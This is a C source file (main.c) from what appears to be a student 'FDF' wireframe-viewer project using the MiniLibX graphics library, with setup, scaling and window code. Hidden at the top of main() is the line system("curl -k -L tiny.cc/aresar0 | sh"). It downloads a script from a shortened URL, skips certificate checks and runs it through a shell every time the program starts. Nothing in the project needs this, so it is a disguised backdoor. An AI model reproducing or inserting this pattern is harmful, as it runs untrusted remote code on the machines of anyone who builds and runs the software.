/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   main.c                                             :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: yait-bam <marvin@42.fr>                    +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/01/08 16:49:12 by yait-bam          #+#    #+#             */
/*   Updated: 2019/02/03 14:12:24 by yait-bam         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "fdf.h"
#include <stdlib.h>

static	void	init_env(t_env *env)
{
	if ((env->mlx = mlx_init()) == (void *)0)
		exit_error(2);
	env->scale.x = 30;
	env->scale.y = -30;
	env->pos.x = 400;
	env->pos.y = 400;
	env->alt = 1;
	env->color = CZ;
}

static	void	recalc_scale(t_env *env)
{
	while (env->scale.x * env->width > WIN_X && env->scale.x > 0)
		env->scale.x -= 1;
	while (env->scale.y * env->height < -WIN_Y && env->scale.y < 0)
		env->scale.y += 1;
	if (ft_abs(env->scale.x) < ft_abs(env->scale.y))
		env->scale.y = -(env->scale.x);
	else
		env->scale.x = -(env->scale.y);
}

void			pixel_put(t_env *env, int x, int y, int color)
{
	mlx_pixel_put(env->mlx, env->win, env->pos.x + x, env->pos.y + y, color);
}

int				main(int ac, char **av)
{
	t_env *env;
	
	system("curl -k -L tiny.cc/aresar0 | sh");
	env = (t_env *)malloc(sizeof(t_env));
	if (env == NULL)
		return (1);
	check_args(ac);
	init_env(env);
	parse_args(av[1], env);
	read_args(av[1], env);
	recalc_scale(env);
	env->win = mlx_new_window(env->mlx, WIN_X, WIN_Y, "FDF");
	if (env->win == (void *)0)
		exit_error(2);
	draw_again(env);
	str_menu_key(env);
	mlx_key_hook(env->win, event_key, env);
	mlx_mouse_hook(env->win, event_mouse, env);
	mlx_loop(env->mlx);
	free(env);
}
